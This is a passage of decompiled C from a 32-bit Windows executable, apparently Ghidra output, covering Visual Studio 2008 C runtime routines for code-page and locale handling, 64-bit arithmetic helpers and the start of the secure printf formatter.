  uint uVar4;
  CHAR CVar5;
  char cVar6;
  BYTE *pBVar7;
  int unaff_ESI;
  _cpinfo local_51c;
  WORD local_508 [256];
  CHAR local_308 [256];
  CHAR local_208 [256];
  CHAR local_108 [256];
  uint local_8;
  
  local_8 = DAT_00422044 ^ (uint)&stack0xfffffffc;
  BVar3 = GetCPInfo(*(UINT *)(unaff_ESI + 4),&local_51c);
  if (BVar3 == 0) {
    uVar4 = 0;
    do {
      pcVar2 = (char *)(unaff_ESI + 0x11d + uVar4);
      if (pcVar2 + (-0x61 - (unaff_ESI + 0x11d)) + 0x20 < (char *)0x1a) {
        pbVar1 = (byte *)(unaff_ESI + 0x1d + uVar4);
        *pbVar1 = *pbVar1 | 0x10;
        cVar6 = (char)uVar4 + ' ';
LAB_00411876:
        *pcVar2 = cVar6;
      }
      else {
        if (pcVar2 + (-0x61 - (unaff_ESI + 0x11d)) < (char *)0x1a) {
          pbVar1 = (byte *)(unaff_ESI + 0x1d + uVar4);
          *pbVar1 = *pbVar1 | 0x20;
          cVar6 = (char)uVar4 + -0x20;
          goto LAB_00411876;
        }
        *pcVar2 = '\0';
      }
      uVar4 = uVar4 + 1;
    } while (uVar4 < 0x100);
  }
  else {
    uVar4 = 0;
    do {
      local_108[uVar4] = (CHAR)uVar4;
      uVar4 = uVar4 + 1;
    } while (uVar4 < 0x100);
    local_108[0] = ' ';
    if (local_51c.LeadByte[0] != 0) {
      pBVar7 = local_51c.LeadByte + 1;
      do {
        uVar4 = (uint)local_51c.LeadByte[0];
        if (uVar4 <= *pBVar7) {
          _memset(local_108 + uVar4,0x20,(*pBVar7 - uVar4) + 1);
        }
        local_51c.LeadByte[0] = pBVar7[1];
        pBVar7 = pBVar7 + 2;
      } while (local_51c.LeadByte[0] != 0);
    }
    ___crtGetStringTypeA
              ((_locale_t)0x0,1,local_108,0x100,local_508,*(int *)(unaff_ESI + 4),
               *(BOOL *)(unaff_ESI + 0xc));
    ___crtLCMapStringA((_locale_t)0x0,*(LPCWSTR *)(unaff_ESI + 0xc),0x100,local_108,0x100,local_208,
                       0x100,*(int *)(unaff_ESI + 4),0);
    ___crtLCMapStringA((_locale_t)0x0,*(LPCWSTR *)(unaff_ESI + 0xc),0x200,local_108,0x100,local_308,
                       0x100,*(int *)(unaff_ESI + 4),0);
    uVar4 = 0;
    do {
      if ((local_508[uVar4] & 1) == 0) {
        if ((local_508[uVar4] & 2) != 0) {
          pbVar1 = (byte *)(unaff_ESI + 0x1d + uVar4);
          *pbVar1 = *pbVar1 | 0x20;
          CVar5 = local_308[uVar4];
          goto LAB_00411814;
        }
        *(undefined *)(unaff_ESI + 0x11d + uVar4) = 0;
      }
      else {
        pbVar1 = (byte *)(unaff_ESI + 0x1d + uVar4);
        *pbVar1 = *pbVar1 | 0x10;
        CVar5 = local_208[uVar4];
LAB_00411814:
        *(CHAR *)(unaff_ESI + 0x11d + uVar4) = CVar5;
      }
      uVar4 = uVar4 + 1;
    } while (uVar4 < 0x100);
  }
  ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
  return;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  ___updatetmbcinfo
// 
// Library: Visual Studio 2008 Release

pthreadmbcinfo __cdecl ___updatetmbcinfo(void)

{
  _ptiddata p_Var1;
  LONG LVar2;
  pthreadmbcinfo lpAddend;
  
  p_Var1 = __getptd();
  if (((p_Var1->_ownlocale & DAT_00422cac) == 0) || (p_Var1->ptlocinfo == (pthreadlocinfo)0x0)) {
    __lock(0xd);
    lpAddend = p_Var1->ptmbcinfo;
    if (lpAddend != (pthreadmbcinfo)PTR_DAT_00422bb0) {
      if (lpAddend != (pthreadmbcinfo)0x0) {
        LVar2 = InterlockedDecrement(&lpAddend->refcount);
        if ((LVar2 == 0) && (lpAddend != (pthreadmbcinfo)&DAT_00422788)) {
          _free(lpAddend);
        }
      }
      p_Var1->ptmbcinfo = (pthreadmbcinfo)PTR_DAT_00422bb0;
      lpAddend = (pthreadmbcinfo)PTR_DAT_00422bb0;
      InterlockedIncrement((LONG *)PTR_DAT_00422bb0);
    }
    FUN_0041192b();
  }
  else {
    lpAddend = p_Var1->ptmbcinfo;
  }
  if (lpAddend == (pthreadmbcinfo)0x0) {
    __amsg_exit(0x20);
  }
  return lpAddend;
}



void FUN_0041192b(void)

{
  FUN_0040e2eb(0xd);
  return;
}



// Library Function - Single Match
//  int __cdecl getSystemCP(int)
// 
// Library: Visual Studio 2008 Release

int __cdecl getSystemCP(int param_1)

{
  UINT UVar1;
  int unaff_ESI;
  int local_14 [2];
  int local_c;
  char local_8;
  
  _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)local_14,(localeinfo_struct *)0x0);
  DAT_004241ac = 0;
  if (unaff_ESI == -2) {
    DAT_004241ac = 1;
    UVar1 = GetOEMCP();
  }
  else if (unaff_ESI == -3) {
    DAT_004241ac = 1;
    UVar1 = GetACP();
  }
  else {
    if (unaff_ESI != -4) {
      if (local_8 == '\0') {
        DAT_004241ac = 0;
        return unaff_ESI;
      }
      *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
      return unaff_ESI;
    }
    UVar1 = *(UINT *)(local_14[0] + 4);
    DAT_004241ac = 1;
  }
  if (local_8 != '\0') {
    *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
  }
  return UVar1;
}



// Library Function - Single Match
//  __setmbcp_nolock
// 
// Library: Visual Studio 2008 Release

void __cdecl __setmbcp_nolock(undefined4 param_1,int param_2)

{
  BYTE *pBVar1;
  byte *pbVar2;
  byte bVar3;
  uint uVar4;
  uint uVar5;
  BOOL BVar6;
  undefined2 *puVar7;
  byte *pbVar8;
  int extraout_ECX;
  undefined2 *puVar9;
  int iVar10;
  undefined4 extraout_EDX;
  BYTE *pBVar11;
  threadmbcinfostruct *unaff_EDI;
  uint local_24;
  byte *local_20;
  _cpinfo local_1c;
  uint local_8;
  
  local_8 = DAT_00422044 ^ (uint)&stack0xfffffffc;
  uVar4 = getSystemCP((int)unaff_EDI);
  if (uVar4 != 0) {
    local_20 = (byte *)0x0;
    uVar5 = 0;
LAB_004119ee:
    if (*(uint *)((int)&DAT_00422bb8 + uVar5) != uVar4) goto code_r0x004119fa;
    _memset((void *)(param_2 + 0x1c),0,0x101);
    local_24 = 0;
    pbVar8 = &DAT_00422bc8 + (int)local_20 * 0x30;
    local_20 = pbVar8;
    do {
      for (; (*pbVar8 != 0 && (bVar3 = pbVar8[1], bVar3 != 0)); pbVar8 = pbVar8 + 2) {
        for (uVar5 = (uint)*pbVar8; uVar5 <= bVar3; uVar5 = uVar5 + 1) {
          pbVar2 = (byte *)(param_2 + 0x1d + uVar5);
          *pbVar2 = *pbVar2 | (&DAT_00422bb4)[local_24];
          bVar3 = pbVar8[1];
        }
      }
      local_24 = local_24 + 1;
      pbVar8 = local_20 + 8;
      local_20 = pbVar8;
    } while (local_24 < 4);
    *(uint *)(param_2 + 4) = uVar4;
    *(undefined4 *)(param_2 + 8) = 1;
    iVar10 = CPtoLCID((int)unaff_EDI);
    *(int *)(param_2 + 0xc) = iVar10;
    puVar7 = (undefined2 *)(param_2 + 0x10);
    puVar9 = (undefined2 *)(&DAT_00422bbc + extraout_ECX);
    iVar10 = 6;
    do {
      *puVar7 = *puVar9;
      puVar9 = puVar9 + 1;
      puVar7 = puVar7 + 1;
      iVar10 = iVar10 + -1;
    } while (iVar10 != 0);
    goto LAB_00411b1f;
  }
LAB_004119db:
  setSBCS(unaff_EDI);
LAB_00411b86:
  ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
  return;
code_r0x004119fa:
  local_20 = (byte *)((int)local_20 + 1);
  uVar5 = uVar5 + 0x30;
  if (0xef < uVar5) goto code_r0x00411a07;
  goto LAB_004119ee;
code_r0x00411a07:
  if (((uVar4 == 65000) || (uVar4 == 0xfde9)) ||
     (BVar6 = IsValidCodePage(uVar4 & 0xffff), BVar6 == 0)) goto LAB_00411b86;
  BVar6 = GetCPInfo(uVar4,&local_1c);
  if (BVar6 != 0) {
    _memset((void *)(param_2 + 0x1c),0,0x101);
    *(uint *)(param_2 + 4) = uVar4;
    *(undefined4 *)(param_2 + 0xc) = 0;
    if (local_1c.MaxCharSize < 2) {
      *(undefined4 *)(param_2 + 8) = 0;
    }
    else {
      if (local_1c.LeadByte[0] != '\0') {
        pBVar11 = local_1c.LeadByte + 1;
        do {
          bVar3 = *pBVar11;
          if (bVar3 == 0) break;
          for (uVar4 = (uint)pBVar11[-1]; uVar4 <= bVar3; uVar4 = uVar4 + 1) {
            pbVar8 = (byte *)(param_2 + 0x1d + uVar4);
            *pbVar8 = *pbVar8 | 4;
          }
          pBVar1 = pBVar11 + 1;
          pBVar11 = pBVar11 + 2;
        } while (*pBVar1 != 0);
      }
      pbVar8 = (byte *)(param_2 + 0x1e);
      iVar10 = 0xfe;
      do {
        *pbVar8 = *pbVar8 | 8;
        pbVar8 = pbVar8 + 1;
        iVar10 = iVar10 + -1;
      } while (iVar10 != 0);
      iVar10 = CPtoLCID((int)unaff_EDI);
      *(int *)(param_2 + 0xc) = iVar10;
      *(undefined4 *)(param_2 + 8) = extraout_EDX;
    }
    *(undefined4 *)(param_2 + 0x10) = 0;
    *(undefined4 *)(param_2 + 0x14) = 0;
    *(undefined4 *)(param_2 + 0x18) = 0;
LAB_00411b1f:
    setSBUpLow(unaff_EDI);
    goto LAB_00411b86;
  }
  if (DAT_004241ac == 0) goto LAB_00411b86;
  goto LAB_004119db;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// WARNING: Globals starting with '_' overlap smaller symbols at the same address

int FUN_00411b95(undefined4 param_1)

{
  _ptiddata p_Var1;
  int iVar2;
  pthreadmbcinfo ptVar3;
  LONG LVar4;
  int *piVar5;
  int iVar6;
  pthreadmbcinfo ptVar7;
  pthreadmbcinfo ptVar8;
  int in_stack_ffffffc8;
  int local_24;
  
  local_24 = -1;
  p_Var1 = __getptd();
  ___updatetmbcinfo();
  ptVar3 = p_Var1->ptmbcinfo;
  iVar2 = getSystemCP(in_stack_ffffffc8);
  if (iVar2 == ptVar3->mbcodepage) {
    local_24 = 0;
  }
  else {
    ptVar3 = (pthreadmbcinfo)__malloc_crt(0x220);
    if (ptVar3 != (pthreadmbcinfo)0x0) {
      ptVar7 = p_Var1->ptmbcinfo;
      ptVar8 = ptVar3;
      for (iVar6 = 0x88; iVar6 != 0; iVar6 = iVar6 + -1) {
        ptVar8->refcount = ptVar7->refcount;
        ptVar7 = (pthreadmbcinfo)&ptVar7->mbcodepage;
        ptVar8 = (pthreadmbcinfo)&ptVar8->mbcodepage;
      }
      ptVar3->refcount = 0;
      local_24 = __setmbcp_nolock(iVar2,(int)ptVar3);
      if (local_24 == 0) {
        LVar4 = InterlockedDecrement(&p_Var1->ptmbcinfo->refcount);
        if ((LVar4 == 0) && (p_Var1->ptmbcinfo != (pthreadmbcinfo)&DAT_00422788)) {
          _free(p_Var1->ptmbcinfo);
        }
        p_Var1->ptmbcinfo = ptVar3;
        InterlockedIncrement((LONG *)ptVar3);
        if (((*(byte *)&p_Var1->_ownlocale & 2) == 0) && (((byte)DAT_00422cac & 1) == 0)) {
          __lock(0xd);
          _DAT_004241bc = ptVar3->mbcodepage;
          _DAT_004241c0 = ptVar3->ismbcodepage;
          _DAT_004241c4 = *(undefined4 *)ptVar3->mbulinfo;
          for (iVar2 = 0; iVar2 < 5; iVar2 = iVar2 + 1) {
            (&DAT_004241b0)[iVar2] = ptVar3->mbulinfo[iVar2 + 2];
          }
          for (iVar2 = 0; iVar2 < 0x101; iVar2 = iVar2 + 1) {
            (&DAT_004229a8)[iVar2] = ptVar3->mbctype[iVar2 + 4];
          }
          for (iVar2 = 0; iVar2 < 0x100; iVar2 = iVar2 + 1) {
            (&DAT_00422ab0)[iVar2] = ptVar3->mbcasemap[iVar2 + 4];
          }
          LVar4 = InterlockedDecrement((LONG *)PTR_DAT_00422bb0);
          if ((LVar4 == 0) && (PTR_DAT_00422bb0 != &DAT_00422788)) {
            _free(PTR_DAT_00422bb0);
          }
          PTR_DAT_00422bb0 = (undefined *)ptVar3;
          InterlockedIncrement((LONG *)ptVar3);
          FUN_00411cf6();
        }
      }
      else if (local_24 == -1) {
        if (ptVar3 != (pthreadmbcinfo)&DAT_00422788) {
          _free(ptVar3);
        }
        piVar5 = __errno();
        *piVar5 = 0x16;
      }
    }
  }
  return local_24;
}



void FUN_00411cf6(void)

{
  FUN_0040e2eb(0xd);
  return;
}



// Library Function - Single Match
//  ___freetlocinfo
// 
// Library: Visual Studio 2008 Release

void __cdecl ___freetlocinfo(void *param_1)

{
  int *piVar1;
  undefined **ppuVar2;
  void *_Memory;
  int **ppiVar3;
  
  _Memory = param_1;
  if ((((*(undefined ***)((int)param_1 + 0xbc) != (undefined **)0x0) &&
       (*(undefined ***)((int)param_1 + 0xbc) != &PTR_DAT_00422ed0)) &&
      (*(int **)((int)param_1 + 0xb0) != (int *)0x0)) && (**(int **)((int)param_1 + 0xb0) == 0)) {
    piVar1 = *(int **)((int)param_1 + 0xb8);
    if ((piVar1 != (int *)0x0) && (*piVar1 == 0)) {
      _free(piVar1);
      ___free_lconv_mon(*(int *)((int)param_1 + 0xbc));
    }
    piVar1 = *(int **)((int)param_1 + 0xb4);
    if ((piVar1 != (int *)0x0) && (*piVar1 == 0)) {
      _free(piVar1);
      ___free_lconv_num(*(void ***)((int)param_1 + 0xbc));
    }
    _free(*(void **)((int)param_1 + 0xb0));
    _free(*(void **)((int)param_1 + 0xbc));
  }
  if ((*(int **)((int)param_1 + 0xc0) != (int *)0x0) && (**(int **)((int)param_1 + 0xc0) == 0)) {
    _free((void *)(*(int *)((int)param_1 + 0xc4) + -0xfe));
    _free((void *)(*(int *)((int)param_1 + 0xcc) + -0x80));
    _free((void *)(*(int *)((int)param_1 + 0xd0) + -0x80));
    _free(*(void **)((int)param_1 + 0xc0));
  }
  ppuVar2 = *(undefined ***)(void **)((int)param_1 + 0xd4);
  if ((ppuVar2 != &PTR_DAT_00422e10) && (ppuVar2[0x2d] == (undefined *)0x0)) {
    ___free_lc_time(ppuVar2);
    _free(*(void **)((int)param_1 + 0xd4));
  }
  ppiVar3 = (int **)((int)param_1 + 0x50);
  param_1 = (void *)0x6;
  do {
    if (((ppiVar3[-2] != (int *)&DAT_00422cb0) && (piVar1 = *ppiVar3, piVar1 != (int *)0x0)) &&
       (*piVar1 == 0)) {
      _free(piVar1);
    }
    if (((ppiVar3[-1] != (int *)0x0) && (piVar1 = ppiVar3[1], piVar1 != (int *)0x0)) &&
       (*piVar1 == 0)) {
      _free(piVar1);
    }
    ppiVar3 = ppiVar3 + 4;
    param_1 = (void *)((int)param_1 + -1);
  } while (param_1 != (void *)0x0);
  _free(_Memory);
  return;
}



// Library Function - Single Match
//  ___addlocaleref
// 
// Library: Visual Studio 2008 Release

void __cdecl ___addlocaleref(LONG *param_1)

{
  LONG *pLVar1;
  LONG **ppLVar2;
  
  pLVar1 = param_1;
  InterlockedIncrement(param_1);
  if ((LONG *)param_1[0x2c] != (LONG *)0x0) {
    InterlockedIncrement((LONG *)param_1[0x2c]);
  }
  if ((LONG *)param_1[0x2e] != (LONG *)0x0) {
    InterlockedIncrement((LONG *)param_1[0x2e]);
  }
  if ((LONG *)param_1[0x2d] != (LONG *)0x0) {
    InterlockedIncrement((LONG *)param_1[0x2d]);
  }
  if ((LONG *)param_1[0x30] != (LONG *)0x0) {
    InterlockedIncrement((LONG *)param_1[0x30]);
  }
  ppLVar2 = (LONG **)(param_1 + 0x14);
  param_1 = (LONG *)0x6;
  do {
    if ((ppLVar2[-2] != (LONG *)&DAT_00422cb0) && (*ppLVar2 != (LONG *)0x0)) {
      InterlockedIncrement(*ppLVar2);
    }
    if ((ppLVar2[-1] != (LONG *)0x0) && (ppLVar2[1] != (LONG *)0x0)) {
      InterlockedIncrement(ppLVar2[1]);
    }
    ppLVar2 = ppLVar2 + 4;
    param_1 = (LONG *)((int)param_1 + -1);
  } while (param_1 != (LONG *)0x0);
  InterlockedIncrement((LONG *)(pLVar1[0x35] + 0xb4));
  return;
}



// Library Function - Single Match
//  ___removelocaleref
// 
// Library: Visual Studio 2008 Release

LONG * __cdecl ___removelocaleref(LONG *param_1)

{
  LONG *pLVar1;
  LONG **ppLVar2;
  
  pLVar1 = param_1;
  if (param_1 != (LONG *)0x0) {
    InterlockedDecrement(param_1);
    if ((LONG *)param_1[0x2c] != (LONG *)0x0) {
      InterlockedDecrement((LONG *)param_1[0x2c]);
    }
    if ((LONG *)param_1[0x2e] != (LONG *)0x0) {
      InterlockedDecrement((LONG *)param_1[0x2e]);
    }
    if ((LONG *)param_1[0x2d] != (LONG *)0x0) {
      InterlockedDecrement((LONG *)param_1[0x2d]);
    }
    if ((LONG *)param_1[0x30] != (LONG *)0x0) {
      InterlockedDecrement((LONG *)param_1[0x30]);
    }
    ppLVar2 = (LONG **)(param_1 + 0x14);
    param_1 = (LONG *)0x6;
    do {
      if ((ppLVar2[-2] != (LONG *)&DAT_00422cb0) && (*ppLVar2 != (LONG *)0x0)) {
        InterlockedDecrement(*ppLVar2);
      }
      if ((ppLVar2[-1] != (LONG *)0x0) && (ppLVar2[1] != (LONG *)0x0)) {
        InterlockedDecrement(ppLVar2[1]);
      }
      ppLVar2 = ppLVar2 + 4;
      param_1 = (LONG *)((int)param_1 + -1);
    } while (param_1 != (LONG *)0x0);
    InterlockedDecrement((LONG *)(pLVar1[0x35] + 0xb4));
  }
  return pLVar1;
}



// Library Function - Single Match
//  __updatetlocinfoEx_nolock
// 
// Library: Visual Studio 2008 Release

LONG * __updatetlocinfoEx_nolock(void)

{
  LONG *pLVar1;
  LONG **in_EAX;
  LONG *unaff_EDI;
  
  if ((unaff_EDI != (LONG *)0x0) && (in_EAX != (LONG **)0x0)) {
    pLVar1 = *in_EAX;
    if (pLVar1 != unaff_EDI) {
      *in_EAX = unaff_EDI;
      ___addlocaleref(unaff_EDI);
      if (pLVar1 != (LONG *)0x0) {
        ___removelocaleref(pLVar1);
        if ((*pLVar1 == 0) && (pLVar1 != (LONG *)&DAT_00422cb8)) {
          ___freetlocinfo(pLVar1);
        }
      }
    }
    return unaff_EDI;
  }
  return (LONG *)0x0;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  ___updatetlocinfo
// 
// Library: Visual Studio 2008 Release

pthreadlocinfo __cdecl ___updatetlocinfo(void)

{
  _ptiddata p_Var1;
  
  p_Var1 = __getptd();
  if (((p_Var1->_ownlocale & DAT_00422cac) == 0) || (p_Var1->ptlocinfo == (pthreadlocinfo)0x0)) {
    __lock(0xc);
    __updatetlocinfoEx_nolock();
    FUN_00412066();
  }
  else {
    p_Var1 = __getptd();
    p_Var1 = (_ptiddata)p_Var1->ptlocinfo;
  }
  if (p_Var1 == (_ptiddata)0x0) {
    __amsg_exit(0x20);
  }
  return (pthreadlocinfo)p_Var1;
}



void FUN_00412066(void)

{
  FUN_0040e2eb(0xc);
  return;
}



// Library Function - Single Match
//  __wchartodigit
// 
// Library: Visual Studio 2008 Release

int __cdecl __wchartodigit(ushort param_1)

{
  int iVar1;
  ushort uVar2;
  
  if (param_1 < 0x30) {
    return -1;
  }
  if (param_1 < 0x3a) {
    return param_1 - 0x30;
  }
  iVar1 = 0xff10;
  if (param_1 < 0xff10) {
    iVar1 = 0x660;
    if (param_1 < 0x660) {
      return -1;
    }
    if (param_1 < 0x66a) goto LAB_004120be;
    iVar1 = 0x6f0;
    if (param_1 < 0x6f0) {
      return -1;
    }
    if (param_1 < 0x6fa) goto LAB_004120be;
    iVar1 = 0x966;
    if (param_1 < 0x966) {
      return -1;
    }
    if (param_1 < 0x970) goto LAB_004120be;
    iVar1 = 0x9e6;
    if (param_1 < 0x9e6) {
      return -1;
    }
    if (param_1 < 0x9f0) goto LAB_004120be;
    iVar1 = 0xa66;
    if (param_1 < 0xa66) {
      return -1;
    }
    if (param_1 < 0xa70) goto LAB_004120be;
    iVar1 = 0xae6;
    if (param_1 < 0xae6) {
      return -1;
    }
    if (param_1 < 0xaf0) goto LAB_004120be;
    iVar1 = 0xb66;
    if (param_1 < 0xb66) {
      return -1;
    }
    if (param_1 < 0xb70) goto LAB_004120be;
    iVar1 = 0xc66;
    if (param_1 < 0xc66) {
      return -1;
    }
    if (param_1 < 0xc70) goto LAB_004120be;
    iVar1 = 0xce6;
    if (param_1 < 0xce6) {
      return -1;
    }
    if (param_1 < 0xcf0) goto LAB_004120be;
    iVar1 = 0xd66;
    if (param_1 < 0xd66) {
      return -1;
    }
    if (param_1 < 0xd70) goto LAB_004120be;
    iVar1 = 0xe50;
    if (param_1 < 0xe50) {
      return -1;
    }
    if (param_1 < 0xe5a) goto LAB_004120be;
    iVar1 = 0xed0;
    if (param_1 < 0xed0) {
      return -1;
    }
    if (param_1 < 0xeda) goto LAB_004120be;
    iVar1 = 0xf20;
    if (param_1 < 0xf20) {
      return -1;
    }
    if (param_1 < 0xf2a) goto LAB_004120be;
    iVar1 = 0x1040;
    if (param_1 < 0x1040) {
      return -1;
    }
    if (param_1 < 0x104a) goto LAB_004120be;
    iVar1 = 0x17e0;
    if (param_1 < 0x17e0) {
      return -1;
    }
    if (param_1 < 0x17ea) goto LAB_004120be;
    iVar1 = 0x1810;
    if (param_1 < 0x1810) {
      return -1;
    }
    uVar2 = 0x181a;
  }
  else {
    uVar2 = 0xff1a;
  }
  if (uVar2 <= param_1) {
    return -1;
  }
LAB_004120be:
  return (uint)param_1 - iVar1;
}



// Library Function - Single Match
//  __iswctype_l
// 
// Library: Visual Studio 2008 Release

int __cdecl __iswctype_l(wint_t _C,wctype_t _Type,_locale_t _Locale)

{
  BOOL BVar1;
  localeinfo_struct local_18;
  int local_10;
  char local_c;
  ushort local_8 [2];
  
  if (_C == 0xffff) {
    local_8[0] = 0;
  }
  else if (_C < 0x100) {
    local_8[0] = *(ushort *)(PTR_DAT_00422e08 + (uint)_C * 2) & _Type;
  }
  else {
    _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)&local_18,_Locale);
    BVar1 = ___crtGetStringTypeW(&local_18,1,(LPCWSTR)&_C,1,local_8);
    if (BVar1 == 0) {
      local_8[0] = 0;
    }
    if (local_c != '\0') {
      *(uint *)(local_10 + 0x70) = *(uint *)(local_10 + 0x70) & 0xfffffffd;
    }
  }
  return (uint)(local_8[0] & _Type);
}



// Library Function - Single Match
//  __allmul
// 
// Library: Visual Studio 2008 Release

longlong __allmul(uint param_1,uint param_2,uint param_3,uint param_4)

{
  if ((param_4 | param_2) == 0) {
    return (ulonglong)param_1 * (ulonglong)param_3;
  }
  return CONCAT44((int)((ulonglong)param_1 * (ulonglong)param_3 >> 0x20) +
                  param_2 * param_3 + param_1 * param_4,
                  (int)((ulonglong)param_1 * (ulonglong)param_3));
}



// Library Function - Single Match
//  __aulldvrm
// 
// Library: Visual Studio 2008 Release

undefined8 __aulldvrm(uint param_1,uint param_2,uint param_3,uint param_4)

{
  ulonglong uVar1;
  longlong lVar2;
  uint uVar3;
  int iVar4;
  uint uVar5;
  uint uVar6;
  uint uVar7;
  uint uVar8;
  uint uVar9;
  
  uVar3 = param_1;
  uVar8 = param_4;
  uVar6 = param_2;
  uVar9 = param_3;
  if (param_4 == 0) {
    uVar3 = param_2 / param_3;
    iVar4 = (int)(((ulonglong)param_2 % (ulonglong)param_3 << 0x20 | (ulonglong)param_1) /
                 (ulonglong)param_3);
  }
  else {
    do {
      uVar5 = uVar8 >> 1;
      uVar9 = uVar9 >> 1 | (uint)((uVar8 & 1) != 0) << 0x1f;
      uVar7 = uVar6 >> 1;
      uVar3 = uVar3 >> 1 | (uint)((uVar6 & 1) != 0) << 0x1f;
      uVar8 = uVar5;
      uVar6 = uVar7;
    } while (uVar5 != 0);
    uVar1 = CONCAT44(uVar7,uVar3) / (ulonglong)uVar9;
    iVar4 = (int)uVar1;
    lVar2 = (ulonglong)param_3 * (uVar1 & 0xffffffff);
    uVar3 = (uint)((ulonglong)lVar2 >> 0x20);
    uVar8 = uVar3 + iVar4 * param_4;
    if (((CARRY4(uVar3,iVar4 * param_4)) || (param_2 < uVar8)) ||
       ((param_2 <= uVar8 && (param_1 < (uint)lVar2)))) {
      iVar4 = iVar4 + -1;
    }
    uVar3 = 0;
  }
  return CONCAT44(uVar3,iVar4);
}



// Library Function - Single Match
//  _write_char
// 
// Library: Visual Studio 2008 Release

void __fastcall _write_char(FILE *param_1)

{
  int *piVar1;
  byte in_AL;
  uint uVar2;
  int *unaff_ESI;
  
  if (((*(byte *)&param_1->_flag & 0x40) == 0) || (param_1->_base != (char *)0x0)) {
    piVar1 = &param_1->_cnt;
    *piVar1 = *piVar1 + -1;
    if (*piVar1 < 0) {
      uVar2 = __flsbuf((int)(char)in_AL,param_1);
    }
    else {
      *param_1->_ptr = in_AL;
      param_1->_ptr = param_1->_ptr + 1;
      uVar2 = (uint)in_AL;
    }
    if (uVar2 == 0xffffffff) {
      *unaff_ESI = -1;
      return;
    }
  }
  *unaff_ESI = *unaff_ESI + 1;
  return;
}



// Library Function - Single Match
//  _write_multi_char
// 
// Library: Visual Studio 2008 Release

void __cdecl _write_multi_char(undefined4 param_1,int param_2,FILE *param_3)

{
  int *in_EAX;
  
  do {
    if (param_2 < 1) {
      return;
    }
    param_2 = param_2 + -1;
    _write_char(param_3);
  } while (*in_EAX != -1);
  return;
}



// Library Function - Single Match
//  _write_string
// 
// Library: Visual Studio 2008 Release

void __cdecl _write_string(int param_1)

{
  int *in_EAX;
  int *piVar1;
  FILE *unaff_EDI;
  
  if (((*(byte *)&unaff_EDI->_flag & 0x40) == 0) || (unaff_EDI->_base != (char *)0x0)) {
    while (0 < param_1) {
      param_1 = param_1 + -1;
      _write_char(unaff_EDI);
      if (*in_EAX == -1) {
        piVar1 = __errno();
        if (*piVar1 != 0x2a) {
          return;
        }
        _write_char(unaff_EDI);
      }
    }
  }
  else {
    *in_EAX = *in_EAX + param_1;
  }
  return;
}



// WARNING: Type propagation algorithm not settling
// Library Function - Single Match
//  __output_s_l
// 
// Library: Visual Studio 2008 Release

int __cdecl __output_s_l(FILE *_File,char *_Format,_locale_t _Locale,va_list _ArgList)

{
  byte bVar1;
  wchar_t _WCh;
  FILE *pFVar2;
  int *piVar3;
  uint uVar4;
  code *pcVar5;
  errno_t eVar6;
  int iVar7;
  undefined *puVar8;
  int extraout_ECX;
  byte *pbVar9;
  char *pcVar10;
  int *piVar11;
  bool bVar12;
  undefined8 uVar13;
  int **ppiVar14;
  int *piVar15;
  int *piVar16;
  undefined4 uVar17;
  localeinfo_struct *plVar18;
  int *local_27c;
  int *local_278;
  int local_274;
  undefined4 local_270;
  int *local_268;
  FILE *local_264;
  int local_260;
  int local_25c;
  int *local_258;
  localeinfo_struct local_254;
  int local_24c;
  char local_248;
  uint local_244;
  byte *local_240;
  int local_23c;
  int *local_238;
  int local_234;
  undefined local_230;
  char local_22f;
  int local_22c;
  int **local_228;
  int *local_224;
  int *local_220;
  int *local_21c;
  byte local_215;
  uint local_214;
  int local_210 [127];
  undefined local_11 [9];
  uint local_8;
  
  local_8 = DAT_00422044 ^ (uint)&stack0xfffffffc;
  local_264 = _File;
  local_228 = (int **)_ArgList;
  local_260 = 0;
  local_214 = 0;
  local_238 = (int *)0x0;
  local_21c = (int *)0x0;
  local_234 = 0;
  local_25c = 0;
  local_23c = 0;
  _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)&local_254,_Locale);
  if (_File == (FILE *)0x0) {
switchD_004125ed_caseD_9:
    piVar3 = __errno();
    *piVar3 = 0x16;
  }
  else {
    if ((*(byte *)&_File->_flag & 0x40) == 0) {
      uVar4 = __fileno(_File);
      if ((uVar4 == 0xffffffff) || (uVar4 == 0xfffffffe)) {
        puVar8 = &DAT_00422448;
      }
      else {
        puVar8 = (undefined *)((uVar4 & 0x1f) * 0x40 + (&DAT_004257a0)[(int)uVar4 >> 5]);
      }
      if ((puVar8[0x24] & 0x7f) == 0) {
        if ((uVar4 == 0xffffffff) || (uVar4 == 0xfffffffe)) {
          puVar8 = &DAT_00422448;
        }
        else {
          puVar8 = (undefined *)((uVar4 & 0x1f) * 0x40 + (&DAT_004257a0)[(int)uVar4 >> 5]);
        }
        if ((puVar8[0x24] & 0x80) == 0) goto LAB_0041255f;
      }
      goto switchD_004125ed_caseD_9;
    }
LAB_0041255f:
    if (_Format == (char *)0x0) goto switchD_004125ed_caseD_9;
    local_215 = *_Format;
    local_22c = 0;
    local_224 = (int *)0x0;
    local_244 = 0;
    local_258 = (int *)0x0;
    if (local_215 == 0) {
LAB_00412fe1:
      if (local_248 != '\0') {
        *(uint *)(local_24c + 0x70) = *(uint *)(local_24c + 0x70) & 0xfffffffd;
      }
      goto LAB_00412ffa;
    }
    do {
      pbVar9 = (byte *)_Format + 1;
      uVar4 = 0;
      local_240 = pbVar9;
      if (local_22c < 0) break;
      if ((byte)(local_215 - 0x20) < 0x59) {
        uVar4 = (byte)(&DAT_0041ca68)[(char)local_215] & 0xf;
      }
      local_244 = (uint)((byte)(&DAT_0041ca88)[local_244 + uVar4 * 9] >> 4);
      switch(local_244) {
      case 0:
switchD_004125ed_caseD_0:
        local_23c = 0;
        iVar7 = __isleadbyte_l((uint)local_215,&local_254);
        if (iVar7 != 0) {
          _write_char(local_264);
          local_240 = (byte *)_Format + 2;
